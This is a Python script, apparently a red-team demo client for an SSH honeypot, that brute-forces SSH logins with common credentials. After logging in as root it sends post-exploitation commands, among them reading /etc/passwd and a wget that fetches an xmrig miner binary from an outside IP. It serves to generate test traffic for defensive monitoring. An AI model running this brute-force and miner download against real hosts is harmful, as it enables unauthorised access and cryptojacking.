import sys
import time
import socket
import argparse
from pathlib import Path
import paramiko

BASE_DIR = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(BASE_DIR))

from config.settings import settings


def run_real_ssh_attack(target_host: str = "127.0.0.1", target_port: int = None, delay: float = 0.4):
    """
    Executes a genuine multi-stage SSH attack over TCP against the IHTIP SSH Honeypot.
    """
    if target_port is None:
        target_port = settings.HONEYPOT_PORT

    print("=" * 65)
    print(f" [RED TEAM DEMO] Launching REAL SSH Attack -> {target_host}:{target_port}")
    print("=" * 65)

    # Check port reachability first
    try:
        with socket.create_connection((target_host, target_port), timeout=2.0):
            pass
    except OSError:
        print(f"[-] Target {target_host}:{target_port} is not reachable.")
        print("    Start the honeypot first using: python run.py all")
        return False

    # Phase 1: Username Enumeration & Brute Force
    print("\n[Phase 1] Running SSH Brute-Force & Username Enumeration...")
    brute_creds = [
        ("admin", "admin@2026"),
        ("ubuntu", "ubuntu"),
        ("oracle", "oracle123"),
        ("deploy", "qwerty"),
        ("postgres", "postgres"),
        ("root", "wrongpass99"),
    ]

    for user, pwd in brute_creds:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=target_host,
                port=target_port,
                username=user,
                password=pwd,
                timeout=3.0,
                allow_agent=False,
                look_for_keys=False
            )
            client.close()
        except paramiko.AuthenticationException:
            print(f"  [-] Auth failed (expected): {user} / {pwd}")
        except Exception as e:
            print(f"  [!] Probe error for {user}: {e}")
        time.sleep(delay)

    # Phase 2: Compromise via weak credential
    print("\n[Phase 2] Compromise: Authenticating with cracked credential (root / root123)...")
    attacker_client = paramiko.SSHClient()
    attacker_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        attacker_client.connect(
            hostname=target_host,
            port=target_port,
            username="root",
            password="root123",
            timeout=5.0,
            allow_agent=False,
            look_for_keys=False
        )
        print("  [+] SSH Interactive Shell ACQUIRED!")

        chan = attacker_client.invoke_shell()
        time.sleep(0.5)
        if chan.recv_ready():
            chan.recv(4096)

        # Phase 3: Automated Post-Exploitation Commands
        print("\n[Phase 3] Executing Post-Exploitation & Malware Ingress Commands...")
        attack_commands = [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/passwd",
            "netstat -antp",
            "wget http://185.220.101.5/bins/xmrig_linux",
            "chmod +x xmrig_linux",
            "crontab -l",
            "sudo -l",
            "exit"
        ]

        for cmd in attack_commands:
            print(f"  [>] Sending over SSH: {cmd}")
            chan.send(cmd + "\n")
            time.sleep(delay + 0.3)
            while chan.recv_ready():
                _ = chan.recv(4096)

        chan.close()
        attacker_client.close()
        print("\n[+] Real SSH Attack Sequence Completed! Check the SOC Dashboard & Live Radar.")
        return True

    except Exception as e:
        print(f"[-] Attack execution failed: {e}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IHTIP Real SSH Attack Demo Client")
    parser.add_argument("--host", default="127.0.0.1", help="Target Honeypot IP")
    parser.add_argument("--port", type=int, default=settings.HONEYPOT_PORT, help="Target Honeypot SSH Port")
    args = parser.parse_args()
    run_real_ssh_attack(target_host=args.host, target_port=args.port)

